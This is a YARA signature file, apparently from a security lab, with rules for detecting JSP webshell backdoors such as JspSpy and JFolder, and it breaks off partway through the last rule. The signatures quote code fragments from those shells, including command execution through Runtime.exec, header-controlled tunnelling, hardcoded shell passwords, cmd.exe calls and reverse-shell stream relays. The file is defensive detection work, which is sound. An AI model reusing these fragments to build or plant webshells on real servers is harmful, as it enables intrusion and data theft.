        $s14 = "response.setHeader(\"X-ERROR\", e.getMessage());" fullword ascii
        $s15 = "String target = request.getHeader(\"X-TARGET\");" fullword ascii
        $s16 = "response.setHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
        $s17 = "String cmd = request.getHeader(\"X-CMD\");" fullword ascii
        $s18 = "} else if (cmd.compareTo(\"DISCONNECT\") == 0) {" fullword ascii
        $s19 = "int port = Integer.parseInt(request.getHeader(\"X-PORT\"));" fullword ascii
        $s20 = "if (cmd.compareTo(\"CONNECT\") == 0) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5a52c7ae56830013707cd5ce5fe01614e6c2daf9
{
    meta:
        description = "jsp - file 5a52c7ae56830013707cd5ce5fe01614e6c2daf9.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "98f64a05f651abc11845a40fd48e8858c4845031ff196bdbf8260a2cb17af59d"
    strings:
        $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
        $x2 = "}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){bw.newLine();}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.c" ascii
        $s3 = "k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" fullword ascii
        $s4 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
        $s5 = "untime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(\"N\")){NN(z1,sb);}else if(Z.equals(\"O\"" ascii
        $s6 = "File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i<d.length();i+=2){os.write((h.indexOf(d.cha" fullword ascii
        $s7 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
        $s8 = "(\"L\")){LL(z1,z2);sb.append(\"1\");}else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtim" ascii
        $s9 = "Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}v" fullword ascii
        $s10 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
        $s11 = "atch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");}c" ascii
        $s12 = "//bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();" fullword ascii
        $s13 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
        $s14 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
        $s15 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
        $s16 = "s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim()" ascii
        $s17 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
        $s18 = ".append(\"->\"+\"|\");String s=request.getSession().getServletContext().getRealPath(\"/\");if(Z.equals(\"A\")){sb.append(s+\"\\t" ascii
        $s19 = "\"--f:\")!=-1){" fullword ascii
        $s20 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9a3b1b82d9d9ce4f25a54794df07ca005bee12bb
{
    meta:
        description = "jsp - file 9a3b1b82d9d9ce4f25a54794df07ca005bee12bb.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9f3b666adc648f9ef129f2862b3d88e1c0f05bd04577df0af59b23adae302406"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s7 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s8 = "out.println(\"<html><head><title> </title><style type=\\\"text/css\\\">\"+" fullword ascii
        $s9 = "idu.com</a></p>\"+" fullword ascii
        $s10 = "private static final String PW = \"k8\"; " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_117eb7a7743d53e767129befd5d2458d1621b23b
{
    meta:
        description = "jsp - file 117eb7a7743d53e767129befd5d2458d1621b23b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule f8b09604ea074d94862d35fcd4e2c6032c66f834
{
    meta:
        description = "jsp - file f8b09604ea074d94862d35fcd4e2c6032c66f834.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fac57539ea8ccf3c4130fc5acf2134e4ffa51e25f862bcaaf28b76454b236c37"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $x2 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
        $s3 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s4 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s7 = "System.out.println(strCommand);" fullword ascii
        $s8 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s9 = "cqq1978@Gmail.com" fullword ascii
        $s10 = "strCommand[1]=strShell[1];" fullword ascii
        $s11 = "strCommand[0]=strShell[0];" fullword ascii
        $s12 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s13 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s14 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s15 = "<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s16 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s17 = "//out.println(path + f1.getName());" fullword ascii
        $s18 = "String[] strCommand=new String[3];" fullword ascii
        $s19 = "private final static int languageNo=1; //Language,0 : Chinese; 1:English" fullword ascii
        $s20 = "out.println(\"error,upload \");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _7e3545b63eead01a8f509cdd5304e78d6ae1a047_fb29687c2e81f09596a7d29efdb47dc52d7a43b0_0
{
    meta:
        description = "jsp - from files 7e3545b63eead01a8f509cdd5304e78d6ae1a047.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91de9ba378e4bd757dad532d7c5a0b59c2404d29d7c20332bc167e3134bc64db"
        hash2 = "79b76053dd37a289a36b93841e24801c563dca62465f7445e797341898208b10"
    strings:
        $x1 = ";b.datepicker._updateDatepicker(a)}}catch(d){b.datepicker.log(d)}return true},_showDatepicker:function(a){a=a.target||" fullword ascii
        $s2 = "(this._dialogInput,false);a.settings={};b.data(this._dialogInput[0],\"datepicker\",a)}g(a.settings,i||{});d=d&&d.constructor==" fullword ascii
        $s3 = "lass,d.dpDiv));h[0]?b.datepicker._selectDay(a.target,d.selectedMonth,d.selectedYear,h[0]):b.datepicker._hideDatepicker();" fullword ascii
        $s4 = "){xa=true;if(s.readyState===\"complete\")return c.ready();if(s.addEventListener){s.addEventListener(\"DOMContentLoaded\"," fullword ascii
        $s5 = "e(a.target);h=a.ctrlKey||a.metaKey;break;case 36:if(a.ctrlKey||a.metaKey)b.datepicker._gotoToday(a.target);h=a.ctrlKey||" fullword ascii
        $s6 = "rentMonth,a.currentDay));return this.formatDate(this._get(a,\"dateFormat\"),d,this._getFormatConfig(a))}});b.fn.datepicker=" fullword ascii
        $s7 = "ce&&V.test(i)&&r.insertBefore(b.createTextNode(V.exec(i)[0]),r.firstChild);i=r.childNodes}if(i.nodeType)e.push(i);else e=" fullword ascii
        $s8 = "ion(a){var b,d,f,e;a=arguments[0]=c.event.fix(a||A.event);a.currentTarget=this;b=a.type.indexOf(\".\")<0&&!a.exclusive;" fullword ascii
        $s9 = "t\",\"width\"];j=j?[i.width(),i.height()]:[i.height(),i.width()];var q=/([0-9]+)%/.exec(a);if(q)a=parseInt(q[1],10)/100*" fullword ascii
        $s10 = "tring\")e.data=c.param(e.data,e.traditional);if(e.dataType===\"jsonp\"){if(n===\"GET\")N.test(e.url)||(e.url+=(ka.test(e.url)?" fullword ascii
        $s11 = "(f.exec(g[3])||\"\").length>1||/^\\w/.test(g[3]))g[3]=k(g[3],null,null,h);else{g=k.filter(g[3],h,l,true^q);l||m.push.apply(m," fullword ascii
        $s12 = "==\"string\"&&!jb.test(i))i=b.createTextNode(i);else if(typeof i===\"string\"){i=i.replace(Ka,Ma);var o=(La.exec(i)||[\"\"," fullword ascii
        $s13 = "!b){this.context=s;this[0]=s.body;this.selector=\"body\";this.length=1;return this}if(typeof a===\"string\")if((d=Ta.exec(a))&&" fullword ascii
        $s14 = "o&&b!==i;){if(c.offset.supportsFixedPosition&&f.position===\"fixed\")break;j=e?e.getComputedStyle(b,null):b.currentStyle;" fullword ascii
        $s15 = "global:true,type:\"GET\",contentType:\"application/x-www-form-urlencoded\",processData:true,async:true,xhr:A.XMLHttpRequest&&(A." ascii
        $s16 = ",qb=[\"Top\",\"Bottom\"],rb=s.defaultView&&s.defaultView.getComputedStyle,Pa=c.support.cssFloat?\"cssFloat\":\"styleFloat\",ja=" fullword ascii
        $s17 = "dialog.overlay.maxZ)return false})},1);b(document).bind(\"keydown.dialog-overlay\",function(d){if(e.options.closeOnEscape&&" fullword ascii
        $s18 = ".origType.replace(O,\"\")===a.type?f.push(i.selector):u.splice(k--,1)}j=c(a.target).closest(f,a.currentTarget);n=0;for(r=" fullword ascii
        $s19 = "ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible\"></div>')}function g(a,d){b.extend(a," fullword ascii
        $s20 = "]||s.documentElement,C=s.createElement(\"script\");C.src=e.url;if(e.scriptCharset)C.charset=e.scriptCharset;if(!j){var B=" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 800KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _094b96e84e01793e542f8d045af68da015a4a7fc_52ed07e55c6e6d640ffc2c6371c585ce063f6329_a2951b681435c42a5d89bdc7606042f821b134ef__1
{
    meta:
        description = "jsp - from files 094b96e84e01793e542f8d045af68da015a4a7fc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
        hash2 = "df204c8c4accc4a508a86a91a63700ea4cf803dd273272c746f94a77ec933d23"
        hash3 = "ab9fd7ec29a69d4caa54c063c86d02f334ae1add49b0acd42a4afdfd05cb7ae0"
        hash4 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
        hash5 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $x2 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        $x3 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
        $s4 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
        $s5 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s6 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
        $s7 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
        $s8 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
        $s9 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
        $s10 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
        $s11 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
        $s12 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
        $s13 = "(new StreamConnector(process.getErrorStream(), socket" fullword ascii
        $s14 = "+ \"  <td width=\\\"20%\\\">Read/Write/Execute</td>\"" fullword ascii
        $s15 = "+ \"'})\\\">Export </a> | <a href=\\\"javascript:doPost({o:'vExport',table:'\"" fullword ascii
        $s16 = "+ \"'})\\\">Struct</a> | <a href=\\\"javascript:doPost({o:'export',table:'\"" fullword ascii
        $s17 = "private static class ExecuteSQLInvoker extends DefaultInvoker {" fullword ascii
        $s18 = "StreamConnector.readFromRemote(targetS, yourS," fullword ascii
        $s19 = "((Invoker) ins.get(\"vd\")).invoke(request, response, JSession);" fullword ascii
        $s20 = "((Invoker) ins.get(\"vPortScan\")).invoke(request, response," fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 500KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _362c4b8a2156b8fade4c83deffe464d1856cd763_4c356d66708eda6004b08a99e97db7b239eafce7_2
{
    meta:
        description = "jsp - from files 362c4b8a2156b8fade4c83deffe464d1856cd763.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7ff4cc8cbe98ffcc3ae3f9e3b9876cff9972f0ba4e082aa63658fb030a269e43"
        hash2 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(cwd));" fullword ascii
        $s2 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\" + myfile__.getName() + \"\\\"\");" fullword ascii
        $s3 = "Process p = Runtime.getRuntime().exec(finals);" fullword ascii
        $s4 = "Hashtable ht = myParser.processData(request.getInputStream(), bound, xCwd, clength);" fullword ascii
        $s5 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s6 = "String tmpdir = xcleanpath(System.getProperty(\"java.io.tmpdir\"));" fullword ascii
        $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
        $s8 = "color:\" + shell_color + \";\" +" fullword ascii
        $s9 = "background:\" + shell_color + \";\" +" fullword ascii
        $s10 = "if(xrunexploit(xCwd,base64,port,request.getRemoteAddr())){" fullword ascii
        $s11 = "if((request.getParameter(\"cmd\")!=null) && (!request.getParameter(\"cmd\").equals(\"\"))){" fullword ascii
        $s12 = "else if((request.getParameter(\"btnListen\")!=null) && (!request.getParameter(\"btnListen\").equals(\"\"))){" fullword ascii
        $s13 = "cookieTable.put(cookies[i].getName(), cookies[i].getValue());" fullword ascii
        $s14 = "if(ht.get(\"btnNewUploadUrl\")!=null && !ht.get(\"btnNewUploadUrl\").equals(\"\")){" fullword ascii
        $s15 = "else if(ht.get(\"btnNewUploadLocal\")!=null && !ht.get(\"btnNewUploadLocal\").equals(\"\")){" fullword ascii
        $s16 = "String filename = xCwd + ht.get(\"filename\").toString().trim();" fullword ascii
        $s17 = "buff.append(\"<a href=\\\"?dir=\" + urlencode(xcleanpath(path)) + \"&properties=\" + urlencode(f) + \"\\\">\");" fullword ascii
        $s18 = "\"<form action=\\\"?dir=\" + xCwd + \"&view=\" + fpath + \"\\\" method=\\\"post\\\">\" +" fullword ascii
        $s19 = "try{ decoded = myDec.decodeBuffer(str); }" fullword ascii
        $s20 = "if((request.getParameter(\"bportC\")!=null) && (is_numeric(request.getParameter(\"bportC\")))){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _402a5dfc90a7a750af6fc4fa96b5e63a105424c0_4a45e4f7ca2bfb1d325d1cff8636d0ece29a4eed_889c4d2a173c673e62ceb3f612494a2e99c56bc7__3
{
    meta:
        description = "jsp - from files 402a5dfc90a7a750af6fc4fa96b5e63a105424c0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
        hash2 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
        hash3 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
        hash4 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
        hash5 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
        hash6 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
        hash7 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
        hash8 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
        hash9 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _7e3545b63eead01a8f509cdd5304e78d6ae1a047_7eb3278d8a711fbf2058be163ed86fd7d5d4ddea_fb29687c2e81f09596a7d29efdb47dc52d7a43b0_4
{
    meta:
        description = "jsp - from files 7e3545b63eead01a8f509cdd5304e78d6ae1a047.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91de9ba378e4bd757dad532d7c5a0b59c2404d29d7c20332bc167e3134bc64db"
        hash2 = "678805f0f5a90ced28c0b4c430c367220f2e315372a4f615f3b47b377c739d77"
        hash3 = "79b76053dd37a289a36b93841e24801c563dca62465f7445e797341898208b10"
    strings:
        $x1 = "* Copyright 2010, AUTHORS.txt (http://jqueryui.com/about)" fullword ascii
        $x2 = "\"\",d]);this._datepickerShowing=false;this._lastInput=null;if(this._inDialog){this._dialogInput.css({position:\"absolute\",left" ascii
        $s3 = "false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState===\"loaded\"||this.readyState===\"compl" ascii
        $s4 = "false&&n===\"GET\"){var r=J(),u=e.url.replace(wb,\"$1_=\"+r+\"$2\");e.url=u+(u===e.url?(ka.test(e.url)?\"&\":\"?\")+\"_=\"+r:\"" ascii
        $s5 = "global:true,type:\"GET\",contentType:\"application/x-www-form-urlencoded\",processData:true,async:true,xhr:A.XMLHttpRequest&&(A." ascii
        $s6 = "c.preventDefault()}if(a){b(c.target).attr(\"tabIndex\",-1);b(a).attr(\"tabIndex\",0);a.focus();return false}return true}},resize" ascii
        $s7 = "u=j?this:c(this.context);if(c.isFunction(f)){e=f;f=w}for(d=(d||\"\").split(\" \");(i=d[o++])!=null;){j=O.exec(i);k=\"\";if(j){k=" ascii
        $s8 = "* http://docs.jquery.com/UI" fullword ascii
        $s9 = "var h=String.fromCharCode(a.charCode==c?a.keyCode:a.charCode);return a.ctrlKey||h<\" \"||!d||d.indexOf(h)>-1}},_doKeyUp:function" ascii
        $s10 = "* http://sizzlejs.com/" fullword ascii
        $s11 = "* http://jquery.com/" fullword ascii
        $s12 = "-1).css(\"outline\",0).keydown(function(q){if(a.closeOnEscape&&q.keyCode&&q.keyCode===b.ui.keyCode.ESCAPE){e.close(q);q.preventD" ascii
        $s13 = "e[n](g)}else{if(h.collapsible&&e)c.toggle();else{f.hide();c.show()}i(true)}f.prev().attr({\"aria-expanded\":\"false\",tabIndex:-" ascii
        $s14 = "\"body\",f)[0]).mousedown(function(e){var a=c.menu.element[0];b(e.target).closest(\".ui-menu-item\").length||setTimeout(function" ascii
        $s15 = "(y=b(\"base\")[0])&&w===y.href)){v=u.hash;u.href=v}if(n.test(v))i.panels=i.panels.add(i._sanitizeSelector(v));else if(v&&v!==\"#" ascii
        $s16 = "a<0&&b(this).css(\"top\",e.top-a)}},resizable:true,show:null,stack:true,title:\"\",width:300,zIndex:1E3},_create:function(){this" ascii
        $s17 = "b.datepicker._pos[1]+=a.offsetHeight}var i=false;b(a).parents().each(function(){i|=b(this).css(\"position\")==\"fixed\";return!i" ascii
        $s18 = "d);for(var h in d)if(d[h]==null||d[h]==c)a[h]=d[h];return a}b.extend(b.ui,{datepicker:{version:\"1.8.6\"}});var e=(new Date).get" ascii
        $s19 = "height:\"auto\"});else{this.uiDialog.show();e=this.element.css(\"height\",\"auto\").height();this.uiDialog.hide();this.element.h" ascii
        $s20 = "load:function(d){d=this._getIndex(d);var h=this,i=this.options,j=this.anchors.eq(d)[0],n=b.data(j,\"load.tabs\");this.abort();if" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 900KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0317bd1d741350d9bc4adbf92801b6a109a57458_032c141019ceabee44e013e27d7e77bc4995125a_0d4b369f7cba724aaa4962caf463c5cfb915a141__5
{
    meta:
        description = "jsp - from files 0317bd1d741350d9bc4adbf92801b6a109a57458.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
        hash2 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
        hash3 = "8f3cbb8d25d2371f2366f0cfbba3cb1e86dff7f5df90278be186abfc03d930be"
        hash4 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
        hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
        hash6 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
        hash7 = "e68119870bc45d5cfda0a196d909288a48dc9ba4182596bfcc61939f79e47e7d"
        hash8 = "187900f5969d51b1e97b8fc86f285d903897663198aa50ce4bccb2d66f3058c8"
        hash9 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
        hash10 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
        hash11 = "3d192c949b8ae3da720884c66c19358246b46e38798bec40a1ad94da65a9034d"
        hash12 = "f91f6009cfee1189db44edcba85b2d9bad819331ee4e369cdcb4e21710c6768c"
        hash13 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
        hash14 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
        hash15 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
        hash16 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
        hash17 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
        hash18 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
        hash19 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
        hash20 = "04ceac0d310cde0e605e38d0e8b841d6f801b57cc6fef5ef7b792612db9acea8"
        hash21 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
        hash22 = "c13a5ec3d790bd79fd182c877b03092f4a80d9de9ea7487444a39b1dd52fc7e1"
        hash23 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
        hash24 = "7806a1b185b2dbb935880050d90ffdc502d5e6ac2b80950bced653f7e506aa00"
        hash25 = "50f7ee552bcb9706aedfdb3219dc340c9a6b3c451d0898b9d4c2ab1ffc14efb1"
        hash26 = "9f3b666adc648f9ef129f2862b3d88e1c0f05bd04577df0af59b23adae302406"
        hash27 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
        hash28 = "20439a4058bb68ba1973e780a51942a19e775f665ea241d8d667afe4f2c49b1a"
        hash29 = "e2daa70b1cbb80911d9c2f48bb527ef64ef55995938cb12beb820e890dd30240"
        hash30 = "84588230bd7d4dbfd3c3544c54e31a0348c614b6c9ad2fd78334cc04dbf16164"
        hash31 = "8aa5dca21b414254d8f772487dd8569b0753813535b3ce1430609f9e52f3fe4c"
        hash32 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
        hash33 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
        hash34 = "9907c1f10ca7ddde1c8f9a652506737b86e60eb8b537c8a42d4fad55e199d3a7"
        hash35 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
        hash36 = "6772b3f0fcf087e3cd64979b34a547897bbd199b314a41d1478ad400314cd0d2"
